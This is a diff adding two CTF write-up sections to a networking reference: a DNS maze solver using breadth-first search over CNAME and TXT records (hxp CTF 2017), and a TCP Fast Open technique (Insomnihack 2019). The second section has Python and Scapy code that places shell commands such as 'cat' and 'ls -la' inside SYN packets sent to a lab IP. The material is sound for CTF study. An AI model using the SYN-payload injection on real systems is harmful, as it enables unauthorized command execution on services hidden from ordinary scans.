@@ -8,6 +8,8 @@
 - [DNS Tunneling / Exfiltration](#dns-tunneling--exfiltration)
 - [DNS Enumeration Quick Reference](#dns-enumeration-quick-reference)
 - [DNS Round-Robin A Record Enumeration (EKOPARTY 2017)](#dns-round-robin-a-record-enumeration-ekoparty-2017)
+- [DNS Maze Traversal (hxp CTF 2017)](#dns-maze-traversal-hxp-ctf-2017)
+- [TCP Fast Open SYN-Payload Command Injection (Insomnihack 2019)](#tcp-fast-open-syn-payload-command-injection-insomnihack-2019)
 
 ---
 
@@ -165,6 +167,41 @@ done < ips.txt
 
 ---
 
+## DNS Maze Traversal (hxp CTF 2017)
+
+A maze encoded as DNS records: each UUID subdomain is a position, `dig -t txt` gives hints, CNAME records for directional subdomains give neighboring positions:
+
+```python
+import dns.resolver
+def get_neighbors(uuid, domain):
+    neighbors = {}
+    for direction in ['up', 'down', 'left', 'right']:
+        try:
+            answer = dns.resolver.resolve(f'{direction}.{uuid}.{domain}', 'CNAME')
+            neighbors[direction] = str(answer[0]).split('.')[0]
+        except: pass
+    return neighbors
+
+# BFS to find exit
+from collections import deque
+queue = deque([(start_uuid, [start_uuid])])
+visited = {start_uuid}
+while queue:
+    current, path = queue.popleft()
+    txt = dns.resolver.resolve(f'{current}.{domain}', 'TXT')
+    if 'flag' in str(txt[0]):
+        print(f"Found flag at {current}: {txt[0]}")
+        break
+    for direction, next_uuid in get_neighbors(current, domain).items():
+        if next_uuid not in visited:
+            visited.add(next_uuid)
+            queue.append((next_uuid, path + [next_uuid]))
+```
+
+**Key insight:** DNS records can encode arbitrary graph structures. Each node is a subdomain (UUID), edges are CNAME records at directional subdomains (up/down/left/right.UUID.domain), and node data is in TXT records. Standard graph search (BFS/DFS) solves these. Cache aggressively — DNS round-trip times dominate runtime. Use `dns.resolver` (dnspython) rather than subprocess `dig` calls for performance.
+
+---
+
 ## DNS Enumeration Quick Reference
 
 ```bash
@@ -184,3 +221,35 @@ done
 # Check for wildcard DNS
 dig randomnonexistent.target.com
 ```
+
+---
+
+## TCP Fast Open SYN-Payload Command Injection (Insomnihack 2019)
+
+**Pattern:** A service uses TCP Fast Open (RFC 7413) and processes up to ~1460 bytes of *data carried in the initial SYN packet*, before the three-way handshake completes. If the handler passes those bytes to a command interpreter, you can invoke commands without ever establishing a full connection — ports that appear closed/filtered to standard TCP scans respond only to SYN+data. A common CTF hint for this technique is any mention of "RFC 741x", "fast open", or "knock with data".
+
+```python
+# Linux kernel: enable client-side TFO: sysctl -w net.ipv4.tcp_fastopen=5
+# Python sockets support TFO via MSG_FASTOPEN on the first sendto().
+import socket
+MSG_FASTOPEN = 0x20000000
+
+def tfo_send(host, port, payload: bytes, timeout=3.0):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    s.sendto(payload, MSG_FASTOPEN, (host, port))
+    try:
+        return s.recv(65536)
+    finally:
+        s.close()
+
+# Scapy variant: raw SYN with payload (no kernel TFO cookie needed for testing)
+# from scapy.all import IP, TCP, send
+# send(IP(dst=host)/TCP(dport=port, flags='S', seq=1)/b'SyN ls -la')
+
+print(tfo_send('10.13.37.99', 3737, b'SyN cat ./secret/me/not/flag.txt'))
+```
+
+**Key insight:** Classic port scans (`nmap -sS`, `nc -vz`) don't carry SYN data, so TFO-only services look silent. When a challenge hints at RFC 7413 or "knock with data", send the payload *inside* the SYN (either via `MSG_FASTOPEN` or a crafted Scapy packet) and watch for a response. The prefix ("SyN" here) is often the service's auth token since it's visible in the first 3-4 bytes of any sniffed SYN.
+
+**References:** Insomnihack 2019 — Net1, writeups 13988, 13989, 13990
